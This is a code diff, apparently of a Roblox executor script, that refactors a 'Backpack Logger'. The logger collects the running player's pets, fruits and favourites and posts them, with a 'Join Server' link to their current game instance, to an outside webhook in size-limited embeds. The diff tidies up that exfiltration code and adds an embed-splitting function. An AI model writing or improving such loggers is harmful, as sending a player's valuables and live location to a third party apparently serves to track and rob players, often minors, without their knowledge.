@@ -16,15 +16,10 @@ local mutationEmojis = {
 }
 
 local function safeRequest(data)
-    if request then
-        return request(data)
-    elseif syn and syn.request then
-        return syn.request(data)
-    elseif http and http.request then
-        return http.request(data)
-    else
-        error("No supported request function found.")
-    end
+    if request then return request(data)
+    elseif syn and syn.request then return syn.request(data)
+    elseif http and http.request then return http.request(data)
+    else error("No supported request function found.") end
 end
 
 local function classifyTools()
@@ -45,7 +40,6 @@ end
 local function parseToolFruitInfo(toolName)
     local baseName = string.match(toolName, "%]%s+(.-)%s+%[") or toolName
     local weight = string.match(toolName, "%[(%d+%.?%d*kg)%]$") or "?"
-
     local modifiers = {}
     for mods in string.gmatch(toolName, "%[(.-)%]") do
         mods = string.match(mods, "^%s*(.-)%s*$")
@@ -53,13 +47,10 @@ local function parseToolFruitInfo(toolName)
             for mod in string.gmatch(mods, "[^,]+") do
                 mod = string.match(mod, "^%s*(.-)%s*$")
                 local emoji = mutationEmojis[mod] or ""
-                if emoji ~= "" then
-                    table.insert(modifiers, emoji)
-                end
+                if emoji ~= "" then table.insert(modifiers, emoji) end
             end
         end
     end
-
     local modStr = (#modifiers > 0) and table.concat(modifiers, " ") or "-"
     return baseName, modStr, weight
 end
@@ -72,10 +63,7 @@ local function parsePetInfo(petName)
 end
 
 local function getFavoriteFruitsAndPets()
-    local favNames = {}
-    local favMutations = {}
-    local favWeights = {}
-
+    local favNames, favMutations, favWeights = {}, {}, {}
     for _, tool in ipairs(Backpack:GetChildren()) do
         if tool:GetAttribute("d") == true then
             if string.match(tool.Name, "^%a+%s+%[.-[Kk][Gg]%]%s+%[Age%s+%d+%]") then
@@ -91,22 +79,17 @@ local function getFavoriteFruitsAndPets()
             end
         end
     end
-
     return favNames, favMutations, favWeights
 end
 
 local function parsePets(pets)
-    local petNames = {}
-    local petAges = {}
-    local petWeights = {}
-
+    local petNames, petAges, petWeights = {}, {}, {}
     for _, petName in ipairs(pets) do
         local baseName, weight, age = parsePetInfo(petName)
         table.insert(petNames, baseName)
         table.insert(petAges, "[Age " .. age .. "]")
         table.insert(petWeights, "[" .. weight .. "]")
     end
-
     return petNames, petAges, petWeights
 end
 
@@ -118,12 +101,28 @@ local function sortFruitsAlphabetically(fruits)
     end)
 end
 
+-- Split embeds if too large (25 fields or 5800 chars)
+local function splitEmbedsByLimit(allFields)
+    local embeds = {}
+    local current = { fields = {}, totalChars = 0 }
+    for _, field in ipairs(allFields) do
+        local len = #field.name + #field.value
+        if #current.fields >= 25 or (current.totalChars + len > 5800) then
+            table.insert(embeds, current)
+            current = { fields = {}, totalChars = 0 }
+        end
+        table.insert(current.fields, field)
+        current.totalChars += len
+    end
+    if #current.fields > 0 then table.insert(embeds, current) end
+    return embeds
+end
+
 local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
     local userId = LocalPlayer.UserId
     local username = LocalPlayer.Name
     local fields = {}
 
-    -- PETS
     if #pets > 0 then
         table.insert(fields, { name = "Pets", value = " ", inline = false })
         local petNames, petAges, petWeights = parsePets(pets)
@@ -132,11 +131,9 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
         table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(petWeights, "\n") .. "\n```", inline = true })
     end
 
-    -- FRUITS
     if #fruits > 0 then
         table.insert(fields, { name = "Fruits", value = " ", inline = false })
         sortFruitsAlphabetically(fruits)
-
         local fruitNames, fruitMutations, fruitWeights = {}, {}, {}
         for _, tool in ipairs(fruits) do
             local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
@@ -144,13 +141,11 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
             table.insert(fruitMutations, modStr)
             table.insert(fruitWeights, "[" .. weight .. "]")
         end
-
         table.insert(fields, { name = "🍑 Fruits", value = "```\n" .. table.concat(fruitNames, "\n") .. "\n```", inline = true })
         table.insert(fields, { name = "🧩 Mutation", value = "```\n" .. table.concat(fruitMutations, "\n") .. "\n```", inline = true })
         table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(fruitWeights, "\n") .. "\n```", inline = true })
     end
 
-    -- FAVORITES
     if #favNames > 0 then
         table.insert(fields, { name = "Favorites", value = " ", inline = false })
         table.insert(fields, { name = "⭐ Favorites", value = "```\n" .. table.concat(favNames, "\n") .. "\n```", inline = true })
@@ -159,28 +154,17 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
     end
 
     local joinLink = string.format("__**[✅ Join Server](https://www.roblox.com/games/%s?jobId=%s)**__", game.PlaceId, game.JobId)
+    local embeds = splitEmbedsByLimit(fields)
 
-    -- SPLIT FIELDS into 25-per-embed chunks
-    local function chunkify(tbl, size)
-        local chunks = {}
-        for i = 1, #tbl, size do
-            table.insert(chunks, { unpack(tbl, i, math.min(i + size - 1, #tbl)) })
-        end
-        return chunks
-    end
-
-    local chunks = chunkify(fields, 25)
-    for i, chunk in ipairs(chunks) do
+    for i, chunk in ipairs(embeds) do
         local embed = {
             title = username .. "'s Backpack Inventory" .. (i > 1 and (" (Part " .. i .. ")") or ""),
             url = "https://www.roblox.com/users/" .. userId .. "/profile",
             color = 0x00BFFF,
-            fields = chunk,
+            description = (i == 1) and joinLink or nil,
+            fields = chunk.fields,
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }
-        if i == 1 then
-            embed.description = joinLink
-        end
 
         local payload = {
             username = "Backpack Logger",
@@ -200,7 +184,7 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
             warn("❌ Failed part " .. i .. ":", response.StatusCode, response.StatusMessage)
         end
 
-        task.wait(1.2) -- Slight delay to avoid rate limits
+        task.wait(1.2)
     end
 end
 
